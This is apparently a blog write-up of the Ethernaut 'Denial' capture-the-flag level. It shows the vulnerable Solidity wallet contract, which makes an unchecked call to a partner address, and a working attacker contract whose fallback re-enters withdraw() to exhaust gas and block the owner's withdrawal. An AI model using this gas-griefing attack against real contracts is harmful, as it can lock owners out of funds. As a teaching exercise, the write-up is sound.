---
layout: post
title: Ethernaut - 20. Denial
date:  2022-09-23
tags: ethernaut solidity
---
## Difficulty: 🌕🌕🌕🌑🌑
> This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.<br />
If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.


## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

### Writeup
There is a line `partner.call{value:amountToSend}("");` in the function `withdraw()`. So we can create a parner contract and write some malicious code in `fallback` function to drain all gas.
1. Get new instance.
2. Create a new contract.
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    interface IDenial {
        function withdraw() external;
        function setWithdrawPartner(address _partner) external;
    }

    contract DenialAttacker {
        fallback () external payable {
            IDenial(msg.sender).withdraw();
        }
    }
    ```
3. Compile and deploy.
4. Call `setWithdrawPartner` method.
    ``` javascript

    await contract.setWithdrawPartner('YOUR_DENIALATTACKER_CONTRACT_ADDRESS')

    ```
5. Submit instance ξ( ✿＞◡❛)